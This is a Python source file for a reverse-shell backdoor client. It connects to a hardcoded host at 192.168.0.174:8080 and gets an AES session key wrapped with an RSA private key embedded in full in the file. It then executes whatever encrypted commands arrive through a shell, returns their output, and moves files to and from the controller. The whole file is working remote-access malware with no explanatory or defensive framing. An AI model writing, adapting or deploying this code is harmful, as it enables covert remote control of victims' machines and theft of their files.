import subprocess
import socket
import os
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16
def GET_AES(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()
def encrypt(message):
    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message
def decrypt(cipher):
    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    try:
        decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    except ValueError as e:
        print(e)
    return decrypted_message

def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.174', 8080))
    global AES_KEY
    AES_KEY = s.recv(1024)
    AES_KEY = GET_AES(AES_KEY)
    AES_KEY = AES_KEY.encode()

    def download(filename):
        f = open(filename, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()

    def upload(filename):
        f= open(filename, 'rb')
        s.send(f.read())

    while True:
        command = s.recv(1024)
        command = decrypt(command).decode()
        if command == 'nuke':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif 'clear' in command:
            pass
        elif command == 'help':
            pass
        elif  command[:6] == 'upload':
            download(command[7:])
        elif command[:8] == 'download':
            upload(command[9:])

        else:
            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read() + CMD.stderr.read()
            s.send(encrypt(result))
connect()


